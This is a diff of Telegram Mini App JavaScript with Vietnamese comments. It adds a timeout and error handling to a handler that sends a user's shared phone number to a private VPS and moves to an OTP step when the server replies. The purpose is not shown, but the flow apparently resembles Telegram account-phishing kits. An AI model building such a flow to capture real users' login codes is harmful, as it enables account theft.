@@ -72,37 +72,47 @@
     });
 
     // 2. Lắng nghe sự kiện trả về từ Telegram
-    tg.onEvent('contactRequested', async (event) => {
-        // Kiểm tra xem người dùng có thực sự share hay không
-        if (event.status === 'sent') {
-            const phone = event.contact.phone_number;
-            console.log("Số điện thoại nhận được:", phone);
-            
-            // Gửi SĐT lên VPS
-            try {
-                const response = await fetch(`${BACKEND_URL}/send_phone`, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ phone: phone })
-                });
-                
-                const data = await response.json();
-                console.log("Phản hồi từ VPS:", data);
+    // ... (các phần cũ phía trên)
 
-                if(data.status === 'otp_sent') {
-                    // Chuyển sang Step 3
-                    goStep(3);
-                } else {
-                    alert("Server chưa phản hồi đúng định dạng!");
-                }
-            } catch (err) {
-                alert("Lỗi kết nối tới server (VPS): " + err.message);
+tg.onEvent('contactRequested', async (event) => {
+    if (event.status === 'sent') {
+        currentPhone = event.contact.phone_number;
+        
+        // === BẮT ĐẦU THAY THẾ TẠI ĐÂY ===
+        try {
+            const controller = new AbortController();
+            const timeoutId = setTimeout(() => controller.abort(), 5000); // Ngắt sau 5 giây
+
+            const response = await fetch(`${BACKEND_URL}/send_phone`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ phone: currentPhone }),
+                signal: controller.signal
+            });
+            
+            clearTimeout(timeoutId);
+            const data = await response.json();
+            
+            if(data.status === 'otp_sent') {
+                goStep(3);
+            } else {
+                alert("Server phản hồi lỗi: " + data.message);
+                document.getElementById("shareContact").textContent = 'Xác Nhận';
             }
-        } else {
-            alert("Bạn đã từ chối chia sẻ số điện thoại!");
+        } catch (err) {
+            // Nếu có lỗi, nó sẽ hiện thông báo cụ thể cho bạn biết
+            alert("Lỗi kết nối VPS: " + err.message + ". Kiểm tra lại Firewall hoặc HTTPS.");
             document.getElementById("shareContact").textContent = 'Xác Nhận';
         }
-    });
+        // === KẾT THÚC THAY THẾ TẠI ĐÂY ===
+        
+    } else {
+        alert("Người dùng từ chối chia sẻ SĐT");
+        document.getElementById('shareContact').textContent = 'Xác Nhận';
+    }
+});
+
+// ... (các phần phía dưới)
 
     // Hàm chuyển màn hình
     function goStep(n) {
